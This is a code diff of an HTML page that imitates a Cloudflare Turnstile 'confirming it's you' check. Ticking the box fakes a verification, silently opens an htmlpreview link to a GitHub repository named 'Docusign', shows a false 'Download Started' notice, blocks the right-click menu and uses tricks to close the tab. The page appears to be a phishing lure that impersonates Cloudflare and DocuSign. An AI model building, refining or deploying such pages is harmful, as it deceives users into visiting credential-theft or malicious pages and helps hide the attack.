@@ -25,7 +25,6 @@
             text-align: center;
         }
 
-        /* Header Text */
         .header h1 {
             font-size: 20px;
             font-weight: 700;
@@ -40,7 +39,6 @@
             margin: 0 0 24px 0;
         }
 
-        /* Turnstile Widget Box */
         .turnstile-widget {
             display: flex;
             justify-content: space-between;
@@ -61,7 +59,6 @@
             gap: 10px;
         }
 
-        /* Custom Checkbox Styling */
         .custom-checkbox {
             width: 22px;
             height: 22px;
@@ -107,7 +104,6 @@
             font-weight: 400;
         }
 
-        /* Right Side Branding */
         .widget-right {
             display: flex;
             flex-direction: column;
@@ -153,7 +149,6 @@
 
         .dot { margin: 0 3px; font-size: 8px; }
 
-        /* Success Message Styling */
         #success-message {
             display: none;
             text-align: center;
@@ -178,7 +173,7 @@
             line-height: 1.5;
         }
 
-        #success-message button {
+        #close-btn {
             background-color: #f38020;
             color: white;
             border: none;
@@ -190,21 +185,27 @@
             transition: background-color 0.2s;
         }
 
-        #success-message button:hover {
+        #close-btn:hover {
             background-color: #e06c10;
+        }
+        
+        .fallback-text {
+            display: none;
+            font-size: 12px;
+            color: #e06c10;
+            margin-top: 15px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Header Text -->
         <div class="header" id="header">
             <h1>One moment — confirming it's you</h1>
             <p>Complete the check below to continue</p>
         </div>
 
-        <!-- Turnstile Widget -->
         <div class="turnstile-widget" id="turnstile-widget">
             <div class="widget-left">
                 <label for="human-check" class="custom-checkbox" id="custom-checkbox">
@@ -233,17 +234,15 @@
             </div>
         </div>
 
-        <!-- Success Message (Hidden initially) -->
         <div id="success-message">
             <h2>Download Started</h2>
             <p>Your document has been downloaded to your Downloads folder. You can open it from there.</p>
-            <!-- Button explicitly calls the closeWindow function -->
             <button id="close-btn" onclick="closeWindow()">Close Window</button>
+            <p class="fallback-text" id="fallback-text">Your browser blocked automatic closing. Please close this tab manually.</p>
         </div>
     </div>
 
     <script>
-        // Disable right-click context menu
         document.addEventListener('contextmenu', event => event.preventDefault());
 
         const checkbox = document.getElementById('human-check');
@@ -253,52 +252,57 @@
         const header = document.getElementById('header');
         const widget = document.getElementById('turnstile-widget');
         const successMessage = document.getElementById('success-message');
+        const fallbackText = document.getElementById('fallback-text');
 
-        // Set your redirect URL here
         const downloadUrl = "http://htmlpreview.github.io/?https://github.com/sxdydy/Docusign/blob/083b17aa07373618227b490839d0ab824ab4aeae/index.html"; 
 
-        // Function to attempt closing the window
+        // Function to attempt closing the window using multiple browser tricks
         function closeWindow() {
-            // Attempt 1: Standard close
-            window.close();
-            
-            // Attempt 2: Workaround for browsers that block standard close
-            // This opens the current window with a blank URL, which sometimes tricks the browser into allowing the close.
-            setTimeout(() => {
-                window.open('', '_self', '');
+            try {
+                // Trick 1: Standard close
                 window.close();
-            }, 100);
+                
+                // Trick 2: If standard fails, try opening blank in self then closing
+                setTimeout(() => {
+                    window.open('', '_self', '');
+                    window.close();
+                }, 100);
+
+                // Trick 3: If still open after 300ms, show fallback message
+                setTimeout(() => {
+                    fallbackText.style.display = 'block';
+                }, 300);
+
+            } catch (e) {
+                fallbackText.style.display = 'block';
+            }
         }
 
-        // Simulate the Cloudflare Turnstile verification process
         checkbox.addEventListener('change', function() {
             if (this.checked) {
-                // Show loading spinner
                 checkmark.style.display = 'none';
                 spinner.style.display = 'block';
                 customCheckbox.style.borderColor = '#cbd5e1'; 
 
-                // Simulate network delay (1 second)
                 setTimeout(() => {
                     spinner.style.display = 'none';
                     checkmark.style.display = 'block';
                     customCheckbox.style.borderColor = '#f38020'; 
                     customCheckbox.style.backgroundColor = '#fff7ed'; 
                     
-                    // Trigger the download
+                    // Trigger download
                     const link = document.createElement('a');
                     link.href = downloadUrl;
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
 
-                    // Wait a moment for the download prompt to appear, then show the success message
                     setTimeout(() => {
                         header.style.display = 'none';
                         widget.style.display = 'none';
                         successMessage.style.display = 'block';
                         
-                        // Optional: Auto-attempt to close after 5 seconds
+                        // Auto-attempt to close after 5 seconds
                         setTimeout(() => {
                             closeWindow();
                         }, 5000);
@@ -307,7 +311,6 @@
 
                 }, 1000); 
             } else {
-                // Reset state if unchecked
                 checkmark.style.display = 'none';
                 spinner.style.display = 'none';
                 customCheckbox.style.borderColor = '#333';
